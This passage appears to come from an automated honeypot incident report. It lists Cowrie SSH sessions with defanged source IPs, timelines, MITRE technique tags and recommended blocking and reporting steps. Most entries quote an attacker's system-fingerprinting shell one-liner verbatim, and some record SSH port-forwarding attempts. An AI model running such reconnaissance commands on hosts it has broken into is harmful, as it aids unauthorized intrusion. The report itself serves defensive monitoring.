| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:00:39` | `cowrie.session.connect` |
| `2026-09-08 06:00:39` | `cowrie.client.version` |
| `2026-09-08 06:00:39` | `cowrie.client.kex` |
| `2026-09-08 06:00:40` | `cowrie.login.success` |
| `2026-09-08 06:00:41` | `cowrie.session.params` |
| `2026-09-08 06:00:41` | `cowrie.command.input` |
| `2026-09-08 06:00:42` | `cowrie.log.closed` |
| `2026-09-08 06:00:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8512ef48a25e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 06:02 |
| **Last Seen** | 2026-09-08 06:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:02:24` | `cowrie.session.connect` |
| `2026-09-08 06:02:24` | `cowrie.client.version` |
| `2026-09-08 06:02:24` | `cowrie.client.kex` |
| `2026-09-08 06:02:24` | `cowrie.login.success` |
| `2026-09-08 06:02:26` | `cowrie.session.params` |
| `2026-09-08 06:02:26` | `cowrie.command.input` |
| `2026-09-08 06:02:26` | `cowrie.log.closed` |
| `2026-09-08 06:02:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6348f7574316

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 06:04 |
| **Last Seen** | 2026-09-08 06:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:04:05` | `cowrie.session.connect` |
| `2026-09-08 06:04:05` | `cowrie.client.version` |
| `2026-09-08 06:04:05` | `cowrie.client.kex` |
| `2026-09-08 06:04:06` | `cowrie.login.success` |
| `2026-09-08 06:04:07` | `cowrie.session.params` |
| `2026-09-08 06:04:07` | `cowrie.command.input` |
| `2026-09-08 06:04:07` | `cowrie.log.closed` |
| `2026-09-08 06:04:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-989d983478d1

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-08 06:04 |
| **Last Seen** | 2026-09-08 06:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:04:26` | `cowrie.session.connect` |
| `2026-09-08 06:04:26` | `cowrie.client.version` |
| `2026-09-08 06:04:27` | `cowrie.client.kex` |
| `2026-09-08 06:04:27` | `cowrie.login.success` |
| `2026-09-08 06:04:28` | `cowrie.direct-tcpip.request` |
| `2026-09-08 06:04:29` | `cowrie.direct-tcpip.ja4` |
| `2026-09-08 06:04:29` | `cowrie.direct-tcpip.data` |
| `2026-09-08 06:04:30` | `cowrie.direct-tcpip.request` |
| `2026-09-08 06:04:31` | `cowrie.direct-tcpip.ja4` |
| `2026-09-08 06:04:31` | `cowrie.direct-tcpip.data` |
| `2026-09-08 06:04:31` | `cowrie.direct-tcpip.request` |
| `2026-09-08 06:04:32` | `cowrie.direct-tcpip.ja4` |
| `2026-09-08 06:04:32` | `cowrie.direct-tcpip.data` |
| `2026-09-08 06:04:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de0d05095d3f

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-08 06:05 |
| **Last Seen** | 2026-09-08 06:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:05:07` | `cowrie.session.connect` |
| `2026-09-08 06:05:07` | `cowrie.client.version` |
| `2026-09-08 06:05:07` | `cowrie.client.kex` |
| `2026-09-08 06:05:08` | `cowrie.login.success` |
| `2026-09-08 06:05:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa781244a44e

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-08 06:05 |
| **Last Seen** | 2026-09-08 06:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:05:07` | `cowrie.session.connect` |
| `2026-09-08 06:05:07` | `cowrie.client.version` |
| `2026-09-08 06:05:07` | `cowrie.client.kex` |
| `2026-09-08 06:05:08` | `cowrie.login.success` |
| `2026-09-08 06:05:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffa223bea17c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 06:05 |
| **Last Seen** | 2026-09-08 06:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:05:51` | `cowrie.session.connect` |
| `2026-09-08 06:05:52` | `cowrie.client.version` |
| `2026-09-08 06:05:52` | `cowrie.client.kex` |
| `2026-09-08 06:05:52` | `cowrie.login.success` |
| `2026-09-08 06:05:54` | `cowrie.session.params` |
| `2026-09-08 06:05:54` | `cowrie.command.input` |
| `2026-09-08 06:05:54` | `cowrie.log.closed` |
| `2026-09-08 06:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1984ae58edab

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 06:07 |
| **Last Seen** | 2026-09-08 06:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:07:52` | `cowrie.session.connect` |
| `2026-09-08 06:07:52` | `cowrie.client.version` |
| `2026-09-08 06:07:52` | `cowrie.client.kex` |
| `2026-09-08 06:07:52` | `cowrie.login.success` |
| `2026-09-08 06:07:54` | `cowrie.session.params` |
| `2026-09-08 06:07:54` | `cowrie.command.input` |
| `2026-09-08 06:07:54` | `cowrie.log.closed` |
| `2026-09-08 06:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0547bf48ff6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 06:10 |
| **Last Seen** | 2026-09-08 06:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:10:07` | `cowrie.session.connect` |
| `2026-09-08 06:10:07` | `cowrie.client.version` |
| `2026-09-08 06:10:07` | `cowrie.client.kex` |
| `2026-09-08 06:10:08` | `cowrie.login.success` |
| `2026-09-08 06:10:09` | `cowrie.session.params` |
| `2026-09-08 06:10:09` | `cowrie.command.input` |
| `2026-09-08 06:10:09` | `cowrie.log.closed` |
| `2026-09-08 06:10:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6ce5587d309

| Field | Detail |
|---|---|
| **Source IP** | `138.117.244[.]17` |
| **First Seen** | 2026-09-08 06:10 |
| **Last Seen** | 2026-09-08 06:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo "$(uname -a) -$(cat /proc/cpuinfo | grep 'name' | cut -f2 -d: | uniq -c | sed 's/  */ /g')", uname -a, cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c | sed s/  */ /g` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:10:09` | `cowrie.session.connect` |
| `2026-09-08 06:10:09` | `cowrie.client.version` |
| `2026-09-08 06:10:09` | `cowrie.client.kex` |
| `2026-09-08 06:10:09` | `cowrie.login.success` |
| `2026-09-08 06:10:10` | `cowrie.session.params` |
| `2026-09-08 06:10:10` | `cowrie.command.input` |
| `2026-09-08 06:10:10` | `cowrie.command.input` |
| `2026-09-08 06:10:10` | `cowrie.command.input` |
| `2026-09-08 06:10:10` | `cowrie.log.closed` |
| `2026-09-08 06:10:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.117.244[.]17` to AbuseIPDB if not already reported
- [ ] Block `138.117.244[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-213faa4e21dc

| Field | Detail |
|---|---|
| **Source IP** | `124.174.51[.]228` |
| **First Seen** | 2026-09-08 06:11 |
| **Last Seen** | 2026-09-08 06:12 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:11:46` | `cowrie.session.connect` |
| `2026-09-08 06:11:46` | `cowrie.client.version` |
| `2026-09-08 06:12:08` | `cowrie.client.kex` |
| `2026-09-08 06:12:08` | `cowrie.login.success` |
| `2026-09-08 06:12:09` | `cowrie.session.params` |
| `2026-09-08 06:12:09` | `cowrie.command.input` |
| `2026-09-08 06:12:10` | `cowrie.log.closed` |
| `2026-09-08 06:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.174.51[.]228` to AbuseIPDB if not already reported
- [ ] Block `124.174.51[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f132a5ec5d80

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 06:12 |
| **Last Seen** | 2026-09-08 06:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:12:16` | `cowrie.session.connect` |
| `2026-09-08 06:12:17` | `cowrie.client.version` |
| `2026-09-08 06:12:17` | `cowrie.client.kex` |
| `2026-09-08 06:12:18` | `cowrie.login.success` |
| `2026-09-08 06:12:19` | `cowrie.session.params` |
| `2026-09-08 06:12:19` | `cowrie.command.input` |
| `2026-09-08 06:12:20` | `cowrie.log.closed` |
| `2026-09-08 06:12:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4345c2630716

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-08 06:12 |
| **Last Seen** | 2026-09-08 06:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:12:32` | `cowrie.session.connect` |
| `2026-09-08 06:12:32` | `cowrie.client.version` |
| `2026-09-08 06:12:32` | `cowrie.client.kex` |
| `2026-09-08 06:12:32` | `cowrie.login.success` |
| `2026-09-08 06:12:33` | `cowrie.direct-tcpip.request` |
| `2026-09-08 06:12:33` | `cowrie.direct-tcpip.ja4` |
| `2026-09-08 06:12:33` | `cowrie.direct-tcpip.data` |
| `2026-09-08 06:12:33` | `cowrie.direct-tcpip.request` |
| `2026-09-08 06:12:33` | `cowrie.direct-tcpip.ja4` |
| `2026-09-08 06:12:33` | `cowrie.direct-tcpip.data` |
| `2026-09-08 06:12:34` | `cowrie.direct-tcpip.request` |
| `2026-09-08 06:12:34` | `cowrie.direct-tcpip.ja4` |
| `2026-09-08 06:12:34` | `cowrie.direct-tcpip.data` |
| `2026-09-08 06:12:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-206e815cb251

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 06:13 |
| **Last Seen** | 2026-09-08 06:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:13:50` | `cowrie.session.connect` |
| `2026-09-08 06:13:50` | `cowrie.client.version` |
| `2026-09-08 06:13:50` | `cowrie.client.kex` |
| `2026-09-08 06:13:52` | `cowrie.login.success` |
| `2026-09-08 06:13:53` | `cowrie.session.params` |
| `2026-09-08 06:13:53` | `cowrie.command.input` |
| `2026-09-08 06:13:53` | `cowrie.log.closed` |
| `2026-09-08 06:13:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-768ea5ccab09

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 06:15 |
| **Last Seen** | 2026-09-08 06:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:15:25` | `cowrie.session.connect` |
| `2026-09-08 06:15:25` | `cowrie.client.version` |
| `2026-09-08 06:15:25` | `cowrie.client.kex` |
| `2026-09-08 06:15:27` | `cowrie.login.success` |
| `2026-09-08 06:15:28` | `cowrie.session.params` |
| `2026-09-08 06:15:28` | `cowrie.command.input` |
| `2026-09-08 06:15:28` | `cowrie.log.closed` |
| `2026-09-08 06:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a84ce69127f3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 06:17 |
| **Last Seen** | 2026-09-08 06:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:17:03` | `cowrie.session.connect` |
| `2026-09-08 06:17:04` | `cowrie.client.version` |
| `2026-09-08 06:17:04` | `cowrie.client.kex` |
| `2026-09-08 06:17:05` | `cowrie.login.success` |
| `2026-09-08 06:17:06` | `cowrie.session.params` |
| `2026-09-08 06:17:06` | `cowrie.command.input` |
| `2026-09-08 06:17:06` | `cowrie.log.closed` |
| `2026-09-08 06:17:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d950fb7a98f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 06:18 |
| **Last Seen** | 2026-09-08 06:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:18:44` | `cowrie.session.connect` |
| `2026-09-08 06:18:44` | `cowrie.client.version` |
| `2026-09-08 06:18:44` | `cowrie.client.kex` |
| `2026-09-08 06:18:44` | `cowrie.login.success` |
| `2026-09-08 06:18:45` | `cowrie.session.params` |
| `2026-09-08 06:18:45` | `cowrie.command.input` |
| `2026-09-08 06:18:46` | `cowrie.log.closed` |
| `2026-09-08 06:18:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3603d253804

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 06:20 |
| **Last Seen** | 2026-09-08 06:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:20:33` | `cowrie.session.connect` |
| `2026-09-08 06:20:33` | `cowrie.client.version` |
| `2026-09-08 06:20:33` | `cowrie.client.kex` |
| `2026-09-08 06:20:33` | `cowrie.login.success` |
| `2026-09-08 06:20:34` | `cowrie.session.params` |
| `2026-09-08 06:20:34` | `cowrie.command.input` |
| `2026-09-08 06:20:34` | `cowrie.log.closed` |
| `2026-09-08 06:20:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e158e624643d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 06:22 |
| **Last Seen** | 2026-09-08 06:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

